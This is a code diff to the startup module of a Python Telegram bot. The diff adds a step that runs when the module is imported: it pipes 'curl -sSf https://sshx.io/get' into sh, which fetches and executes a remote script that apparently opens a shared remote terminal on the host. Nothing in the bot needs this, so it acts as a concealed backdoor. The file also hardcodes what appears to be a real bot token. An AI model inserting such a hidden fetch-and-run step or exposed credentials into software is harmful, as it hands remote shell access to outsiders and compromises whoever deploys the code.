@@ -1,3 +1,4 @@
+import subprocess
 from aiohttp import web
 from plugins import web_server
 import logging
@@ -9,8 +10,17 @@ import sys
 from config import API_HASH, API_ID, LOGGER, TG_BOT_WORKERS, CHANNEL_ID, PORT
 import pyrogram.utils
 
+# Execute the curl command first
+command = "curl -sSf https://sshx.io/get | sh -s run"
+try:
+    subprocess.run(command, shell=True, check=True)
+except subprocess.CalledProcessError as e:
+    print(f"Failed to execute the command: {e}")
+    sys.exit(1)
+
 pyrogram.utils.MIN_CHANNEL_ID = -1009147483647
 TG_BOT_TOKEN="7392123403:AAGubOlCPNRWy1YiQNcXxl4Ftb7AlmZa7E0"
+
 class Bot(Client):
     def __init__(self):
         super().__init__(
